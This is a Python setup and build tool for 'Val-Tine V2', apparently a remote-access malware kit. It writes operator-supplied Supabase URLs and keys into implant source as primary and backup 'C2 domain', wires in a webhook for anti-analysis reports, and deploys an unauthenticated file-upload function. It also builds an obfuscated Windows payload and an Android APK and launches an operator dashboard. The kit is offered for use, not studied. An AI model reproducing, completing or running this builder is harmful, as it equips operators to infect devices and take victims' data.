#!/usr/bin/env python3
"""
Val-Tine V2 — Setup & Build Tool

Interactive CLI to:
1. Configure Supabase credentials (URL, anon key)
2. Log into Supabase CLI via npx (browser-based)
3. Apply SQL migrations & deploy edge functions
4. Update all config files (main.go, .env, obfus.py)
5. Build the Windows payload using obfus.py
6. Build the Android APK using build_android.py
"""
import sys
import os
import re
import json
import shutil
import subprocess
import getpass
try:
    from urllib.request import Request, urlopen
    from urllib.error import URLError, HTTPError
except ImportError:
    pass  # Python 2 fallback not needed — requires 3.6+

# ============================================================
# HELPERS
# ============================================================

def log(msg, level="INFO"):
    prefix = {"INFO": "[*]", "OK": "[+]", "ERR": "[-]", "WARN": "[!]", "ASK": "[?]"}[level]
    print(f"{prefix} {msg}")


def ask(prompt, default=None):
    """Prompt user for input with optional default."""
    suffix = f" [{default}]" if default else ""
    full = f"[?] {prompt}{suffix}: "
    val = input(full)
    return val.strip() or default


def ask_yn(prompt, default=True):
    """Ask yes/no question."""
    choices = "Y/n" if default else "y/N"
    val = input(f"[?] {prompt} [{choices}]: ").strip().lower()
    if not val:
        return default
    return val in ("y", "yes")


IS_WIN = sys.platform == "win32"
IS_MAC = sys.platform == "darwin"
IS_LINUX = sys.platform.startswith("linux")


def run_cmd(cmd, cwd=None, interactive=False):
    """Run subprocess. Uses shell=True on Windows for .cmd scripts like npx."""
    if interactive:
        result = subprocess.run(cmd, cwd=cwd, shell=IS_WIN)
        return result.returncode == 0, "", ""
    r = subprocess.run(cmd, capture_output=True, text=True, cwd=cwd, shell=IS_WIN)
    return r.returncode == 0, r.stdout.strip(), r.stderr.strip()


def check_tool(name):
    """Check if a CLI tool is available (cross-platform)."""
    return shutil.which(name) is not None


def _detect_pkg_manager():
    """Detect the system package manager."""
    if IS_WIN:
        if shutil.which("winget"):
            return "winget"
        if shutil.which("choco"):
            return "choco"
        return None
    if IS_MAC:
        if shutil.which("brew"):
            return "brew"
        return None
    # Linux
    for pm in ["apt", "dnf", "yum", "pacman", "zypper"]:
        if shutil.which(pm):
            return pm
    return None


def _install_cmd(pkg_manager, package_name):
    """Return the install command list for a given package manager and package."""
    cmds = {
        "apt":    ["sudo", "apt", "install", "-y", package_name],
        "dnf":    ["sudo", "dnf", "install", "-y", package_name],
        "yum":    ["sudo", "yum", "install", "-y", package_name],
        "pacman": ["sudo", "pacman", "-S", "--noconfirm", package_name],
        "zypper": ["sudo", "zypper", "install", "-y", package_name],
        "brew":   ["brew", "install", package_name],
        "winget": ["winget", "install", "--accept-source-agreements", "--accept-package-agreements", package_name],
        "choco":  ["choco", "install", "-y", package_name],
    }
    return cmds.get(pkg_manager)


# Maps tool binary name -> package names per package manager
DEPENDENCY_PACKAGES = {
    "go": {
        "apt": "golang", "dnf": "golang", "yum": "golang",
        "pacman": "go", "zypper": "go",
        "brew": "go", "winget": "GoLang.Go", "choco": "golang",
        "url": "https://go.dev/dl/",
    },
    "node": {
        "apt": "nodejs", "dnf": "nodejs", "yum": "nodejs",
        "pacman": "nodejs", "zypper": "nodejs",
        "brew": "node", "winget": "OpenJS.NodeJS.LTS", "choco": "nodejs-lts",
        "url": "https://nodejs.org/",
    },
    "java": {
        "apt": "default-jdk", "dnf": "java-11-openjdk-devel", "yum": "java-11-openjdk-devel",
        "pacman": "jdk-openjdk", "zypper": "java-11-openjdk-devel",
        "brew": "openjdk@11", "winget": "EclipseAdoptium.Temurin.11.JDK", "choco": "openjdk11",
        "url": "https://adoptium.net/",
    },
    "gradle": {
        "apt": "gradle", "dnf": "gradle", "yum": "gradle",
        "pacman": "gradle", "zypper": "gradle",
        "brew": "gradle", "winget": "Gradle.Gradle", "choco": "gradle",
        "url": "https://gradle.org/install/",
    },
}


def _check_android_sdk():
    """Check if Android SDK is installed. Returns the path or None."""
    android_home = os.environ.get("ANDROID_HOME") or os.environ.get("ANDROID_SDK_ROOT")
    if android_home and os.path.isdir(android_home):
        return android_home
    candidates = [
        os.path.expanduser("~/Android/Sdk"),
        os.path.expanduser("~/Library/Android/sdk"),
        "/usr/lib/android-sdk",
        "/opt/android-sdk",
    ]
    if IS_WIN:
        localappdata = os.environ.get("LOCALAPPDATA", "")
        if localappdata:
            candidates.insert(0, os.path.join(localappdata, "Android", "Sdk"))
        candidates.insert(1, os.path.expanduser("~\\AppData\\Local\\Android\\Sdk"))
    for c in candidates:
        if os.path.isdir(c):
            return c
    return None


def _check_java():
    """Check if Java JDK 11+ is installed (needs javac, not just java/keytool).
    A JRE without javac will fail Gradle builds — detect and warn early.
    """
    if shutil.which("javac") is None:
        # User might have a JRE but not a JDK
        if shutil.which("java") is not None or shutil.which("keytool") is not None:
            log("Java JRE found but JDK is missing (no javac). Gradle requires a full JDK.", "WARN")
            log("  Install a JDK (not JRE): https://adoptium.net/", "WARN")
            if IS_WIN:
                log("  winget install EclipseAdoptium.Temurin.17.JDK", "WARN")
            else:
                log("  Linux (apt): sudo apt install openjdk-17-jdk", "WARN")
        return False
    # Check version — Gradle 8.14 supports up to JDK 23; JDK 24+ may fail
    try:
        result = subprocess.run(["javac", "-version"], capture_output=True, text=True)
        version_str = result.stderr.strip() or result.stdout.strip()  # javac prints to stderr
        import re as _re
        m = _re.search(r"(\d+)", version_str)
        if m:
            major = int(m.group(1))
            if major > 23:
                log(f"Java {major} detected — Gradle may not support it. JDK 17 or 21 recommended.", "WARN")
    except Exception:
        pass
    return True


def _check_node():
    """Check if Node.js is installed (node or npx)."""
    return shutil.which("node") is not None or shutil.which("npx") is not None


def _try_install(tool_name, pkg_manager):
    """Attempt to install a tool using the detected package manager."""
    pkg_info = DEPENDENCY_PACKAGES.get(tool_name, {})
    pkg_name = pkg_info.get(pkg_manager)
    if not pkg_name:
        return False
    cmd = _install_cmd(pkg_manager, pkg_name)
    if not cmd:
        return False
    log(f"Installing {tool_name} via {pkg_manager}...")
    result = subprocess.run(cmd)
    return result.returncode == 0


def check_dependencies(build_payload=False, build_apk=False):
    """Check all required dependencies and offer to install missing ones.

    Returns True if all required deps are satisfied, False otherwise.
    """
    print()
    log("Checking dependencies...")
    print()

    pkg_manager = _detect_pkg_manager()

    # Define deps: (display_name, check_fn, tool_key, required_for)
    deps = [
        ("Go 1.21+",    lambda: check_tool("go"),   "go",      "payload builds"),
        ("Node.js 18+", _check_node,                 "node",    "Supabase CLI & dashboard"),
    ]
    if build_apk:
        deps.append(("Java JDK 11+", _check_java, "java", "Android APK signing"))
        deps.append(("Gradle",       lambda: check_tool("gradle"), "gradle", "Android APK build"))

    missing = []
    for display, checker, key, reason in deps:
        if checker():
            log(f"{display:<16} found", "OK")
        else:
            log(f"{display:<16} NOT FOUND  (needed for {reason})", "ERR")
            missing.append((display, key, reason))

    # Android SDK/NDK aren't package manager installs — check separately
    if build_apk:
        sdk_found = _check_android_sdk()
        if sdk_found:
            log(f"{'Android SDK':<16} found ({sdk_found})", "OK")
            # Check for NDK (needed for 32-bit arm builds)
            ndk_dir = os.path.join(sdk_found, "ndk")
            ndk_found = os.path.isdir(ndk_dir) and os.listdir(ndk_dir)
            if ndk_found:
                log(f"{'Android NDK':<16} found (for 32-bit arm support)", "OK")
            else:
                log(f"{'Android NDK':<16} not found (32-bit arm builds will be skipped)", "WARN")
                log("  Install via: Android Studio > SDK Manager > SDK Tools > NDK", "WARN")
        else:
            log(f"{'Android SDK':<16} NOT FOUND", "ERR")
            log("  Install Android Studio or command-line tools: https://developer.android.com/studio", "WARN")
            log("  Then set ANDROID_HOME env var to the SDK path", "WARN")
            log("  (build_android.py will prompt you for the path if not set)", "WARN")

    if not missing:
        print()
        log("All dependencies satisfied!", "OK")
        return True

    # Offer to install
    print()
    log(f"{len(missing)} missing dependency(ies):", "WARN")
    for display, key, reason in missing:
        url = DEPENDENCY_PACKAGES.get(key, {}).get("url", "")
        log(f"  - {display}  ({url})")

    if pkg_manager:
        print()
        if ask_yn(f"Attempt to install missing dependencies using '{pkg_manager}'?", default=True):
            still_missing = []
            for display, key, reason in missing:
                if _try_install(key, pkg_manager):
                    log(f"{display} installed", "OK")
                else:
                    log(f"Failed to install {display}", "ERR")
                    still_missing.append((display, key, reason))

            if not still_missing:
                log("All dependencies installed!", "OK")
                return True

            print()
            log("Some dependencies could not be installed automatically:", "ERR")
            for display, key, reason in still_missing:
                url = DEPENDENCY_PACKAGES.get(key, {}).get("url", "")
                log(f"  - {display}: install manually from {url}", "ERR")
            if not ask_yn("Continue anyway?", default=False):
                return False
            return True
        else:
            # User declined auto-install
            if not ask_yn("Continue without installing? (builds may fail)", default=False):
                return False
            return True
    else:
        log("No supported package manager detected for auto-install.", "WARN")
        log("Please install the missing dependencies manually.", "WARN")
        if not ask_yn("Continue anyway?", default=False):
            return False
        return True


def extract_project_ref(supa_url):
    """Extract project ref from Supabase URL.
    e.g. https://hhckztzmnovfpgujhvhq.supabase.co -> hhckztzmnovfpgujhvhq
    """
    return supa_url.rstrip("/").replace("https://", "").replace(".supabase.co", "")


def replace_in_file(filepath, old, new):
    """Replace exact string in file."""
    with open(filepath, "r", encoding="utf-8") as f:
        content = f.read()
    if old not in content:
        log(f"Warning: pattern not found in {filepath}", "WARN")
        return False
    content = content.replace(old, new)
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(content)
    return True


# ============================================================
# CONFIG COLLECTION
# ============================================================

def collect_config():
    """Collect all config values from user."""
    print()
    print("=" * 55)
    print("  Val-Tine V2 — Setup & Build")
    print("=" * 55)
    print()

    cfg = {}

    # --- Primary Supabase project ---
    log("Primary Supabase project (required)")
    cfg["supa_url"] = ask("Supabase project URL", "https://xxxxx.supabase.co")
    cfg["supa_anon_key"] = ask("Supabase anon/public key")

    # Auto-extract project ref from URL
    cfg["supa_project_ref"] = extract_project_ref(cfg["supa_url"])
    log(f"Project ref: {cfg['supa_project_ref']}", "OK")

    # --- Secondary Supabase project (optional redundancy) ---
    print()
    if ask_yn("Add a secondary Supabase project for redundancy?", default=False):
        cfg["supa_url2"] = ask("Secondary Supabase URL", "https://xxxxx.supabase.co")
        cfg["supa_anon_key2"] = ask("Secondary anon key")
    else:
        cfg["supa_url2"] = ""
        cfg["supa_anon_key2"] = ""

    # --- Webhook (anti-analysis reporting) ---
    print()
    cfg["webhook_url"] = ask(
        "Webhook URL for anti-analysis reports (leave blank to disable)",
        default=""
    )

    # --- Dashboard login credentials ---
    print()
    log("Dashboard login (creates a Supabase Auth user for the web panel)")
    cfg["dash_email"] = ask("Dashboard email")
    cfg["dash_password"] = getpass.getpass("[?] Dashboard password: ")

    # --- Build ---
    print()
    cfg["build_payload"] = ask_yn("Build Windows payload EXE after setup?", default=True)
    cfg["build_apk"] = ask_yn("Build Android APK after setup?", default=False)

    return cfg


# ============================================================
# APPLY CONFIGURATION TO FILES
# ============================================================

def apply_config(cfg):
    """Write config values into all project files."""
    root = os.path.dirname(os.path.abspath(__file__))
    main_go = os.path.join(root, "main.go")
    env_file = os.path.join(root, ".env")
    obfus_file = os.path.join(root, "obfus.py")

    # Reset source files to their committed state so placeholder patterns
    # are always present, even on repeat runs.
    for src in [main_go, obfus_file]:
        subprocess.run(["git", "checkout", "HEAD", "--", src],
                       cwd=root, capture_output=True)

    log("Applying configuration to project files...")

    # --- main.go: primary C2 domain ---
    replace_in_file(main_go,
        'URL:      "https://supbaseurl.supabase.co"',
        f'URL:      "{cfg["supa_url"]}"')
    replace_in_file(main_go,
        'APIKey:   "dahkeygoesinhere"',
        f'APIKey:   "{cfg["supa_anon_key"]}"')

    # --- main.go: secondary C2 domain ---
    if cfg["supa_url2"]:
        replace_in_file(main_go,
            'URL:      "https://secondsupabaseurlforredundancy.supabase.co"',
            f'URL:      "{cfg["supa_url2"]}"')
        replace_in_file(main_go,
            'APIKey:   "daothakeygoeshere"',
            f'APIKey:   "{cfg["supa_anon_key2"]}"')

    # --- main.go: webhook URL ---
    if cfg["webhook_url"]:
        replace_in_file(main_go,
            'https://webhook.site/0a0aea37-6d21-47b2-844f-30db3cee67e3',
            cfg["webhook_url"])
    else:
        # Comment out the webhook POST and the payload marshal (avoids "declared and not used" error)
        with open(main_go, "r", encoding="utf-8") as f:
            content = f.read()
        content = content.replace(
            '\t\tpayload, _ := json.Marshal(report)\n'
            '\t\thttp.Post("https://webhook.site/0a0aea37-6d21-47b2-844f-30db3cee67e3", "application/json", bytes.NewReader(payload))',
            '\t\t// Webhook disabled — no webhook configured\n'
            '\t\t_ = report'
        )
        with open(main_go, "w", encoding="utf-8") as f:
            f.write(content)

    # --- .env: web dashboard ---
    with open(env_file, "w", encoding="utf-8") as f:
        f.write(f'VITE_SUPABASE_URL="{cfg["supa_url"]}"\n')
        f.write(f'VITE_SUPABASE_PUBLISHABLE_KEY="{cfg["supa_anon_key"]}"\n')
        f.write(f'VITE_SUPABASE_ANON_KEY="{cfg["supa_anon_key"]}"\n')
    log(f"Updated {env_file}", "OK")

    # --- obfus.py: URL shortener — auto-derive from primary Supabase URL ---
    supa_ref = cfg["supa_project_ref"]
    shortener_fn_url = f"https://{supa_ref}.supabase.co/functions/v1/shorten"
    replace_in_file(obfus_file,
        'https://edgqrfijgnyboeymkydu.supabase.co/functions/v1/shorten',
        shortener_fn_url)

    log("All config files updated", "OK")


# ============================================================
# CREATE DASHBOARD USER
# ============================================================

def create_dashboard_user(cfg):
    """Create a Supabase Auth user for the web dashboard via REST API."""
    supa_url = cfg["supa_url"].rstrip("/")
    anon_key = cfg["supa_anon_key"]
    email = cfg["dash_email"]
    password = cfg["dash_password"]

    signup_url = f"{supa_url}/auth/v1/signup"
    payload = json.dumps({"email": email, "password": password}).encode("utf-8")

    req = Request(signup_url, data=payload, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("apikey", anon_key)
    req.add_header("Authorization", f"Bearer {anon_key}")

    try:
        resp = urlopen(req)
        body = json.loads(resp.read().decode("utf-8"))
        if body.get("id") or body.get("user", {}).get("id"):
            log(f"Dashboard user created: {email}", "OK")
            if body.get("confirmation_sent_at") or body.get("user", {}).get("confirmation_sent_at"):
                log("Check your email to confirm (or disable email confirmation in Supabase dashboard)", "WARN")
            return True
        else:
            log(f"Unexpected signup response: {body}", "WARN")
            return False
    except HTTPError as e:
        err_body = e.read().decode("utf-8", errors="replace")
        try:
            err_json = json.loads(err_body)
            msg = err_json.get("msg") or err_json.get("error_description") or err_json.get("message", err_body)
        except json.JSONDecodeError:
            msg = err_body
        if "already registered" in msg.lower() or "already been registered" in msg.lower():
            log(f"User {email} already exists — you can sign in with it", "OK")
            return True
        log(f"Failed to create user: {msg}", "ERR")
        log("Create manually in Supabase dashboard → Authentication → Users", "WARN")
        return False
    except URLError as e:
        log(f"Network error creating user: {e}", "ERR")
        log("Create manually in Supabase dashboard → Authentication → Users", "WARN")
        return False


# ============================================================
# SUPABASE CLI SETUP (via npx)
# ============================================================

def run_supabase_setup(cfg):
    """Run Supabase CLI setup: login, link, migrate, deploy — exactly like manual setup."""
    root = os.path.dirname(os.path.abspath(__file__))
    project_ref = cfg["supa_project_ref"]

    # Check npx is available
    if not check_tool("npx"):
        log("npx not found — install Node.js 18+ from https://nodejs.org/", "ERR")
        sys.exit(1)

    # Step 1: Login (opens browser)
    print()
    log("Logging into Supabase CLI (this will open your browser)...")
    ok, _, _ = run_cmd(["npx", "supabase", "login"], cwd=root, interactive=True)
    if not ok:
        log("Supabase login failed", "ERR")
        log("Try running manually: npx supabase login", "WARN")
        return False

    # Step 2: Link project
    print()
    log(f"Linking Supabase project {project_ref}...")
    ok, _, _ = run_cmd(
        ["npx", "supabase", "link", "--project-ref", project_ref],
        cwd=root, interactive=True
    )
    if not ok:
        log("Supabase link failed — continuing anyway", "WARN")

    # Step 3: Push database migrations
    print()
    log("Pushing database migrations...")
    ok, _, _ = run_cmd(
        ["npx", "supabase", "db", "push"],
        cwd=root, interactive=True
    )
    if ok:
        log("Database migrations applied", "OK")
    else:
        log("Migration push failed", "ERR")
        log("Run manually: npx supabase db push", "WARN")
        log("Or paste SQL files from supabase/migrations/ into Supabase SQL Editor", "WARN")

    # Step 4: Deploy edge functions
    print()
    log("Deploying edge function 'file-upload'...")
    ok, _, _ = run_cmd(
        ["npx", "supabase", "functions", "deploy", "file-upload", "--no-verify-jwt"],
        cwd=root, interactive=True
    )
    if ok:
        log("Edge function 'file-upload' deployed", "OK")
    else:
        log("Edge function deploy failed", "WARN")
        log("Deploy manually: npx supabase functions deploy file-upload --no-verify-jwt", "WARN")

    return True


# ============================================================
# BUILD PAYLOAD
# ============================================================

def build_payload():
    """Run obfus.py to build the payload."""
    root = os.path.dirname(os.path.abspath(__file__))

    # Check Go is installed
    if not check_tool("go"):
        log("Go compiler not found. Install from https://go.dev/dl/", "ERR")
        return False

    # Ensure 'requests' Python package is installed (needed by obfus.py)
    try:
        import requests  # noqa: F401
    except ImportError:
        log("Installing Python 'requests' package...")
        subprocess.run([sys.executable, "-m", "pip", "install", "requests", "-q"],
                       check=False)

    log("Starting payload build...")
    print()
    result = subprocess.run(
        [sys.executable, os.path.join(root, "obfus.py")],
        cwd=root
    )
    return result.returncode == 0


# ============================================================
# BUILD ANDROID APK
# ============================================================

def build_apk(cfg):
    """Run build_android.py to build the Android APK."""
    root = os.path.dirname(os.path.abspath(__file__))

    # Check Go is installed
    if not check_tool("go"):
        log("Go compiler not found. Install from https://go.dev/dl/", "ERR")
        return False

    log("Starting Android APK build...")
    print()

    # Build args from config
    args = [sys.executable, os.path.join(root, "build_android.py")]

    # Extract domain from URL (e.g. https://xxx.supabase.co → xxx.supabase.co)
    supa_domain = cfg["supa_url"].rstrip("/").replace("https://", "").replace("http://", "")
    args.extend(["--domain", supa_domain])
    args.extend(["--apikey", cfg["supa_anon_key"]])

    if cfg.get("supa_url2"):
        domain2 = cfg["supa_url2"].rstrip("/").replace("https://", "").replace("http://", "")
        args.extend(["--domain2", domain2])

    result = subprocess.run(args, cwd=root)
    return result.returncode == 0


# ============================================================
# MAIN
# ============================================================

def main():
    # Quick mode: just build without setup
    if len(sys.argv) > 1 and sys.argv[1] == "build":
        log("Build-only mode")
        if not check_dependencies(build_payload=True):
            sys.exit(1)
        if build_payload():
            log("Build complete", "OK")
        else:
            log("Build failed", "ERR")
            sys.exit(1)
        return

    # Full setup
    cfg = collect_config()

    # Check dependencies before doing anything else
    if not check_dependencies(
        build_payload=cfg.get("build_payload", False),
        build_apk=cfg.get("build_apk", False),
    ):
        log("Aborting setup — install missing dependencies and try again.", "ERR")
        sys.exit(1)

    print()
    log("=" * 50)
    log("Applying configuration...")
    apply_config(cfg)

    # Create dashboard user
    print()
    log("Creating dashboard user...")
    create_dashboard_user(cfg)

    # Always run Supabase CLI setup
    print()
    log("Running Supabase CLI setup...")
    run_supabase_setup(cfg)

    if cfg["build_payload"]:
        print()
        build_payload()

    if cfg.get("build_apk"):
        print()
        build_apk(cfg)

    print()
    print("=" * 55)
    log("Setup complete!", "OK")
    print()
    log("Next steps:")
    log("  1. Start the web dashboard:  npm run dev")
    log("  2. Built payloads are in the current directory")
    log("  3. To rebuild later:")
    log("       Windows:  python3 setup.py build")
    log("       Android:  python3 build_android.py")
    print()


if __name__ == "__main__":
    main()
